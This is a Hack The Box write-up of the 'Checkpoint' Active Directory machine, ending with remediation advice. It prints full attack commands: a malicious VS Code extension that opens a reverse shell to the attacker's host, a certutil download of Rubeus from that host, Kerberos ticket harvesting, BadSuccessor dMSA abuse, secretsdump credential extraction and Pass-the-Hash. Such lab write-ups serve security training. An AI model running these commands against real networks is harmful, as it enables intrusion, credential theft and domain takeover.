---
layout: writeup
title: "Checkpoint"
date: 2026-09-03
platform: Hack The Box
category: Active Directory
difficulty: Medium
os: Windows
image: /assets/writeups/checkpoint/image-25.png
---

## Summary

Checkpoint is a Windows Active Directory machine built around **BadSuccessor**, the 2025 privilege-escalation technique that abuses Windows Server 2025's delegated Managed Service Accounts (dMSA) feature. The engagement starts from an assumed-breach position with a single low-privileged credential pair, used to enumerate group memberships and ACLs across the domain. A soft-deleted, writable AD object is discovered and restored, resurrecting an account whose credentials grant write access to an internal share used to distribute VS Code extensions. A malicious `.vsix` package is crafted and dropped on that share, and loading it in a developer's VS Code instance returns a reverse shell. From that foothold, a Kerberos TGT is harvested via Rubeus `tgtdeleg`, which exposes further writable AD objects — including a service account tied to a backup-access group. That write permission is leveraged to create a rogue dMSA via the BadSuccessor technique, forging a ticket that carries the service account's privileges. The resulting access reaches a backup share containing a full VM memory snapshot of a domain server. Offline memory forensics with Volatility 3 and `secretsdump` recover a local Administrator NTLM hash, which is reused via Pass-the-Hash against the domain controller to obtain a SYSTEM shell and the root flag.

---

## Target Information

- **Domain:** `checkpoint.htb`
- **Domain Controller:** `DC01` — `10.129.113.81` (Windows 11 / Server 2025, Build 26100)
- **Starting credentials:** `alex.turner` / `Checkpoint2024!`

This writeup picks up from an assumed-breach starting point — a valid, low-privileged domain account is already in hand — which is a common setup for Active Directory assessments that focus on lateral movement, misconfigured ACLs, and privilege escalation rather than the initial perimeter breach.

---

## Enumeration

### Validating Credentials and Mapping Group Membership

The first step is confirming the supplied credentials are valid against the domain controller using NetExec (`nxc`):

```bash
nxc smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!'
```

![Validating alex.turner's credentials over SMB]({{ '/assets/writeups/checkpoint/image-1.png' | relative_url }})

*NetExec confirms valid authentication as `checkpoint.htb\alex.turner` against `DC01`, a Windows 11 / Server 2025 host.*

With valid credentials confirmed, LDAP group membership is enumerated across the groups of interest:

```bash
nxc ldap 10.129.113.81 -u alex.turner -p 'Checkpoint2024!' --groups "DevTeam"
nxc ldap 10.129.113.81 -u alex.turner -p 'Checkpoint2024!' --groups "Engineering-Staff"
nxc ldap 10.129.113.81 -u alex.turner -p 'Checkpoint2024!' --groups "IT-Staff"
nxc ldap 10.129.113.81 -u alex.turner -p 'Checkpoint2024!' --groups "BackupAccess"
```

![LDAP group membership enumeration across DevTeam, Engineering-Staff, IT-Staff and BackupAccess]({{ '/assets/writeups/checkpoint/image-2.png' | relative_url }})

*Membership enumeration reveals `ryan.brooks`, `michael.torres` and `brian.jenkins` in **DevTeam**; `kevin.patterson` and `megan.perry` added in **Engineering-Staff**; `alex.turner`, `james.harper` and `sarah.mitchell` in **IT-Staff**; and, notably, `svc_deploy` as the sole member of **BackupAccess**.*

The `svc_deploy` account standing alone in `BackupAccess` is a detail worth keeping in mind — it resurfaces later as the pivot point for the domain-wide privilege escalation.

### Hunting for Writable Objects

Rather than brute-forcing further group names, the assessment shifts to asking the domain directly which objects `alex.turner` can write to, using BloodyAD:

```bash
bloodyAD --host 10.129.113.81 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable --otype USER --right WRITE --detail
```

![BloodyAD reveals a writable, soft-deleted AD object]({{ '/assets/writeups/checkpoint/image-3.png' | relative_url }})

*The query returns a **soft-deleted** user object — `CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb` — over which `alex.turner` holds `WRITE` on several attributes, including `shadowFlag`, `shadowExpire` and `shadowInactive`.*

When an Active Directory object is deleted, it isn't immediately purged — it is tombstoned and, if the AD Recycle Bin is enabled, kept in a recoverable state in `CN=Deleted Objects` for a configurable retention period. Here, `alex.turner` retains `WRITE` rights on the deleted account `Mark Davies`, a leftover permission that was likely never revoked when the employee's account was removed. Because the object is still restorable, this translates directly into the ability to bring the account — and whatever access it had — back to life.

---

## Exploitation

### Restoring a Deleted Account

The deleted object is restored using BloodyAD's `set restore` action, targeting the full distinguished name captured above:

```bash
bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb \
  set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
```

![Successful restoration of the deleted Mark Davies account]({{ '/assets/writeups/checkpoint/image-4.png' | relative_url }})

*The object is restored successfully under `CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb`, bringing the account back into an active, usable state.*

With the account restored, its original password is tested — a reasonable first guess, since the account was presumably provisioned under the same password policy/rotation as `alex.turner`:

```bash
nxc smb checkpoint.htb -u mark.davies -p 'Checkpoint2024!'
```

![Password reuse confirmed for the restored account]({{ '/assets/writeups/checkpoint/image-5.png' | relative_url }})

*Authentication succeeds — `mark.davies` is active again and reuses the same password, `Checkpoint2024!`.*

### Discovering a Writable Developer Share

Share enumeration is performed for the newly recovered identity:

```bash
nxc smb checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares
```

![Share enumeration reveals the writable DevDrop share]({{ '/assets/writeups/checkpoint/image-6.png' | relative_url }})

*Alongside the usual `ADMIN$`, `C$`, `IPC$`, `NETLOGON` and `SYSVOL` shares, two stand out: `VMBackups` (inaccessible at this stage) and **`DevDrop`**, described as a "VS Code extension share for approved `.vsix` packages compatible with VS Code engine `1.118.0`" — and critically, `mark.davies` holds **READ, WRITE** on it.*

A share dedicated to distributing internal VS Code extensions, writable by a regular user account, is a textbook internal supply-chain weakness: whatever is dropped there is implicitly trusted and expected to be picked up and loaded by other users' editors.

### Weaponizing a Malicious VSIX Extension

A `.vsix` file is simply a zipped VS Code extension package. If a crafted extension is placed where developers are expected to pull approved packages from, loading it executes arbitrary code — in this case a PowerShell-based reverse shell — under the context of whoever installs it. The open-source tool [vsix_revshell.py](https://github.com/Goultarde/vsix_revshell.py) is used to build a payload, matching the VS Code engine constraint (`^1.118.0`) advertised by the share itself:

```bash
python3 create_vsix.py -i 10.10.14.138 -p 9001
```

![Generating a malicious VSIX reverse shell package]({{ '/assets/writeups/checkpoint/image-7.png' | relative_url }})

*The tool generates `revshell.vsix`, a PowerShell reverse-shell payload targeting `10.10.14.138:9001`, packaged to satisfy the `^1.118.0` VS Code engine requirement advertised by the `DevDrop` share.*

The listener is started and the extension is uploaded to the writable share:

```bash
rlwrap nc -lnvp 9001
```
```bash
smbclient //checkpoint.htb/DevDrop \
  -U 'checkpoint.htb\mark.davies%Checkpoint2024!' \
  -c 'put revshell.vsix'
```

Shortly after, a connection is received:

![Reverse shell received as checkpoint\ryan.brooks]({{ '/assets/writeups/checkpoint/image-8.png' | relative_url }})

*The extension is picked up automatically and executed, returning a PowerShell reverse shell as `checkpoint\ryan.brooks` — running inside `C:\Program Files\Microsoft VS Code`, confirming the extension auto-load vector.*

### User Flag

```powershell
cd C:\Users\ryan.brooks\Desktop
cat user.txt
```

![User flag recovered from ryan.brooks' Desktop]({{ '/assets/writeups/checkpoint/image-9.png' | relative_url }})

*The user flag is retrieved: `205deb4277e896613b13c45512ffafaf`.*

---

## Post-Exploitation / Privilege Escalation

### Harvesting a TGT with Rubeus `tgtdeleg`

With a foothold as `ryan.brooks`, Rubeus is staged on the victim to interact with Kerberos directly:

```bash
git clone https://github.com/0x0greper/Rubeus-v2.3.3-Build.git
cd Rubeus-v2.3.3-Build
python -m http.server 8000
```

![Serving Rubeus.exe over HTTP from the attacker host]({{ '/assets/writeups/checkpoint/image-10.png' | relative_url }})

```powershell
certutil -urlcache -split -f http://10.10.14.138:8000/Rubeus.exe C:\Users\ryan.brooks\Documents\Rubeus.exe
```

![Rubeus.exe downloaded to the target via certutil]({{ '/assets/writeups/checkpoint/image-11.png' | relative_url }})

*Rubeus.exe (474,112 bytes) is successfully staged in `ryan.brooks`'s Documents folder.*

The `tgtdeleg` command is used specifically because it retrieves a usable TGT for a **non-elevated** user — it abuses the Kerberos GSS-API negotiation path (requesting a fake delegation flag for a `cifs/` SPN) to coax the LSA into handing over a full ticket-granting-ticket without requiring administrative rights on the host:

![Rubeus documentation highlighting tgtdeleg: retrieve a usable TGT for a non-elevated user]({{ '/assets/writeups/checkpoint/image-12.png' | relative_url }})

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

![Base64 TGT extracted for ryan.brooks via Rubeus tgtdeleg]({{ '/assets/writeups/checkpoint/image-13.png' | relative_url }})

*Rubeus successfully performs the fake-delegation request against `cifs/DC01.checkpoint.htb` and dumps a base64-encoded `.kirbi` ticket for `ryan.brooks`.*

### Converting and Loading the Ticket

The ticket is decoded and converted to a format usable by the Impacket toolset on the attacking machine:

```bash
base64 -d ryan.kirbi > ryan_ok.kirbi
impacket-ticketConverter ryan_ok.kirbi ryan.ccache
```

![Converting the kirbi ticket to ccache format]({{ '/assets/writeups/checkpoint/image-14.png' | relative_url }})

```bash
export KRB5CCNAME=ryan.ccache
```

![Exporting KRB5CCNAME to the converted ticket]({{ '/assets/writeups/checkpoint/image-15.png' | relative_url }})

### Dealing with Kerberos Clock Skew

Kerberos authentication fails whenever the client clock drifts more than five minutes from the KDC's. Checking the offset and correcting it is a required step before the forged ticket can be used:

```bash
sudo ntpdate -q dc01.checkpoint.htb
sudo ntpdate dc01.checkpoint.htb
```

![Checking and correcting clock skew against the domain controller]({{ '/assets/writeups/checkpoint/image-16.png' | relative_url }})

*The attacking machine's clock was off by roughly **7 hours**; `ntpdate` steps the local clock forward to match `DC01`, after which Kerberos operations proceed normally.*

### Further ACL Enumeration via the Delegated Ticket

With a valid ticket cached, the same writable-objects query is repeated — this time authenticating with Kerberos instead of a password:

```bash
bloodyAD -k ccache=$KRB5CCNAME -dc-ip 10.129.113.81 --host dc01.checkpoint.htb -d checkpoint.htb get writable --right WRITE --detail
```

![BloodyAD auto-correcting clock skew and querying writable objects via Kerberos]({{ '/assets/writeups/checkpoint/image-17.png' | relative_url }})

![Writable svc_deploy object discovered]({{ '/assets/writeups/checkpoint/image-18.png' | relative_url }})

*The query surfaces `CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb` as writable — the same `svc_deploy` service account observed earlier as the sole member of the `BackupAccess` group.*

This is the key pivot: `ryan.brooks`, via the delegated ticket, holds write access over a service account whose group membership grants access to backup infrastructure.

### Privilege Escalation via BadSuccessor (dMSA Abuse)

**BadSuccessor** is a 2025 Active Directory attack technique (disclosed by Akamai research) targeting delegated Managed Service Accounts (dMSA), a feature introduced in Windows Server 2025. A principal with the right to create a dMSA in an Organizational Unit, combined with write access over a target account, can create a dMSA that is marked as the **successor** of that target account. Because dMSAs are designed to simplify service-account migrations, Active Directory treats the dMSA as inheriting the identity it supersedes: on first Kerberos authentication, the KDC issues the dMSA a PAC containing the **SID and group memberships of the superseded account** — without ever needing to know or crack its actual credentials.

Here, that technique is applied directly against `svc_deploy`:

```bash
bloodyAD -k ccache=$KRB5CCNAME \
  -u ryan.brooks \
  --dc-ip 10.129.113.81 \
  --host dc01.checkpoint.htb \
  -d checkpoint.htb \
  add badSuccessor evilDMSA6 \
  -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
  --ou "OU=DMSAHolder,DC=checkpoint,DC=htb"
```

![BadSuccessor attack creating a rogue dMSA that supersedes svc_deploy]({{ '/assets/writeups/checkpoint/image-19.png' | relative_url }})

*A new dMSA, `evilDMSA6$`, is created in `OU=DMSAHolder` and linked as the successor of `svc_deploy`. BloodyAD immediately authenticates as the new account and retrieves a forged TGT (`krbtgt/CHECKPOINT.HTB`) — issued to `evilDMSA6$`, but carrying `svc_deploy`'s effective privileges once presented to a service.*

```bash
ls
# evilDMSA6_in.ccache
```

![Forged ticket for evilDMSA6 saved to disk]({{ '/assets/writeups/checkpoint/image-20.png' | relative_url }})

### Reaching the Backup Share

The forged ticket is loaded and used to authenticate over SMB as the impersonated identity:

```bash
export KRB5CCNAME=evilDMSA6_in.ccache
impacket-smbclient -k -no-pass dc01.checkpoint.htb
```

![Authenticating to DC01 via the forged BadSuccessor ticket]({{ '/assets/writeups/checkpoint/image-21.png' | relative_url }})

Listing shares now exposes `VMBackups`, previously out of reach:

```
# shares
# use VMBackups
# cd NightlyBackup_2024-11-01/memory forensics
# ls
```

![VMBackups share now accessible, revealing a full VM memory snapshot]({{ '/assets/writeups/checkpoint/image-22.png' | relative_url }})

*Inside `NightlyBackup_2024-11-01/memory forensics` sits a complete VMware snapshot of a **Windows Server 2019** host: disk (`.vmdk`), configuration (`.vmx`/`.vmxf`), snapshot metadata (`.vmsn`/`.vmsd`), NVRAM, and — most importantly — a raw **physical memory dump**, `Windows Server 2019-Snapshot1.vmem` (2.1 GB).*

### Offline Memory Forensics with Volatility 3

A raw memory image contains, among other things, every registry hive that was loaded in memory at the time of the snapshot — including `SAM`, `SYSTEM` and `SECURITY`, which together are enough to recover local account password hashes without ever touching the live disk. Volatility 3's `hivelist` plugin is used to carve and dump them directly from the `.vmem` file:

```bash
vol.py -f "Windows Server 2019-Snapshot1.vmem" -o hives windows.registry.hivelist.HiveList --dump
```

![Volatility 3 dumping registry hives from the raw memory image]({{ '/assets/writeups/checkpoint/image-23.png' | relative_url }})

*Volatility 3 enumerates every hive resident in memory and dumps each one to disk, including `registry.SAM`, `registry.SYSTEM` and `registry.SECURITY`.*

### Extracting Local Credentials with secretsdump

With the three hives recovered, Impacket's `secretsdump` is run in offline mode to decrypt and extract local account secrets:

```bash
impacket-secretsdump -sam hives/registry.SAM.*.hive \
  -system hives/registry.SYSTEM.*.hive \
  -security hives/registry.SECURITY.*.hive LOCAL
```

![secretsdump recovering the local Administrator hash and LSA secrets]({{ '/assets/writeups/checkpoint/image-24.png' | relative_url }})

*The local SAM hashes are recovered, including:*

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b:::
```

*along with cached domain logon data, DPAPI machine/user keys, and the `NL$KM` secret.*

### Pass-the-Hash to the Domain Controller

The recovered Administrator hash is tested directly against the domain controller via Pass-the-Hash — a strong indicator of local Administrator credential reuse between the backed-up server and `DC01`:

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b Administrator@checkpoint.htb
```

![SYSTEM shell obtained on DC01 via Pass-the-Hash]({{ '/assets/writeups/checkpoint/image-25.png' | relative_url }})

*`psexec` uploads a service binary, installs and starts it via `SVCManager`, and returns an interactive `SYSTEM` shell directly on `DC01`.*

### Root Flag

The root flag is present but initially inaccessible due to its ACL:

```cmd
cd C:\Users\max.palmer\Desktop
type root.txt
```

```
Access is denied.
```

Ownership and permissions are overridden to force access:

```cmd
takeown /f C:\Users\max.palmer\Desktop\root.txt
icacls C:\Users\max.palmer\Desktop\root.txt /grant "NT AUTHORITY\SYSTEM":F
type root.txt
```

![Root flag recovered after taking ownership of the protected file]({{ '/assets/writeups/checkpoint/image-26.png' | relative_url }})

*Ownership is transferred and full control is granted to `NT AUTHORITY\SYSTEM`, after which the root flag is retrieved: `d51afd011fd33a1225c2d168f3be697a`.*

---

## Attack Chain Summary

1. **Valid low-privileged credentials** (`alex.turner`) are used to enumerate AD group membership and ACLs.
2. A **soft-deleted, writable user object** (`Mark Davies`) is found and restored via the AD Recycle Bin, reusing a leaked password pattern.
3. The restored account has **write access to `DevDrop`**, an internal VS Code extension distribution share.
4. A **malicious `.vsix` package** is uploaded and auto-loaded, yielding a reverse shell as `ryan.brooks`.
5. **Rubeus `tgtdeleg`** harvests a usable TGT without needing local admin rights.
6. The ticket exposes a further **writable object** (`svc_deploy`), a member of the `BackupAccess` group.
7. **BadSuccessor** is used to create a rogue dMSA superseding `svc_deploy`, forging a ticket with its privileges.
8. The forged ticket unlocks the **`VMBackups`** share, containing a full **VM memory snapshot**.
9. **Volatility 3** carves registry hives from the raw memory image; **secretsdump** recovers the local **Administrator hash**.
10. **Pass-the-Hash** against `DC01` grants a **SYSTEM** shell, and the **root flag** is recovered after a `takeown`/`icacls` ACL override.

---

## Key Takeaways & Remediation

- **Stale ACLs on deleted objects** are easy to miss: audit `WRITE` permissions over `CN=Deleted Objects` and revoke them as part of the employee off-boarding process, not just the account disable step.
- **Internal package/extension shares should never be writable by regular users.** Distribution of `.vsix`/script/binary packages should go through a signed, reviewed pipeline, not an open SMB share.
- **BadSuccessor (dMSA abuse)** affects any domain with Windows Server 2025 DCs where low-privileged principals hold `Create Child` on an OU together with write rights on a target account. Until patched/mitigated, audit and restrict who can create dMSA objects, and monitor for `msDS-ManagedAccountPrecededByLink` modifications outside of planned migrations.
- **Backup shares holding full VM memory/disk snapshots** are equivalent to holding the live system's credentials — they must be restricted to the same tier of access as the systems they back up, and ideally encrypted at rest.
- **Local Administrator credential reuse** across hosts (including between a legacy backed-up server and a live domain controller) should be eliminated with a managed, randomized local admin password solution (e.g. LAPS).

---

## Tools & Techniques

- **NetExec (nxc)** — SMB/LDAP authentication checks and group enumeration.
- **BloodyAD** — ACL enumeration, AD object restoration, and the BadSuccessor (dMSA) attack.
- **vsix_revshell.py** — malicious VS Code extension (`.vsix`) generation.
- **Rubeus** — `tgtdeleg` ticket-granting-ticket harvesting.
- **Impacket** (`ticketConverter`, `smbclient`, `secretsdump`, `psexec`) — Kerberos ticket handling, SMB access, offline credential extraction, and Pass-the-Hash execution.
- **Volatility 3** — offline registry hive extraction from a raw VM memory snapshot.
- **ntpdate** — Kerberos clock-skew correction.
